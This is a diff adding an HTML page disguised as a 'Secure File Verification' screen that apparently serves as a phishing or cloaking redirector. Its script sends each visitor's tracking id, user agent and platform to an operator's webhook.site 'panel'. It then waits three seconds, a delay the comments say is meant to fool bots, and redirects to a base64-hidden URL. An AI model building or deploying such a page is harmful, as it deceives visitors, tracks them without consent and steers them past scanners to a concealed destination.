@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure File Verification</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f7f9; }
+        .card { background: white; padding: 2.5rem; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.05); text-align: center; max-width: 380px; }
+        .spinner { border: 3px solid #e1e4e8; border-top: 3px solid #0052cc; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #172b4d; font-size: 1.1rem; margin: 0 0 10px; }
+        p { color: #5e6c84; font-size: 0.85rem; line-height: 1.4; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="spinner"></div>
+        <h2>Establishing Secure Connection</h2>
+        <p>Please wait while we verify your browser's security certificates.</p>
+    </div>
+
+    <script>
+        (function() {
+            // 1. YOUR PANEL: Your specific Webhook.site URL
+            const myPanel = "https://webhook.site/da2082dc-5f8f-418f-9ed4-122a6015ab92";
+
+            // 2. YOUR TARGET: Encoded in Base64 (https://izfyb.acesporty.com/secondproject/)
+            const encodedVault = "aHR0cHM6Ly9penZ5Yi5hY2VzcG9ydHkuY29tL3NlY29uZHByb2plY3Qv";
+
+            // Get the User ID from the URL (e.g. ?id=123)
+            const params = new URLSearchParams(window.location.search);
+            const userID = params.get('id') || 'untracked_visitor';
+
+            // SEND DATA TO YOUR PANEL
+            fetch(myPanel, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({
+                    id: userID,
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    time: new Date().toLocaleString()
+                })
+            });
+
+            // 3. THE REDIRECT: 3-second delay to fool basic bots
+            setTimeout(() => {
+                window.location.replace(atob(encodedVault));
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
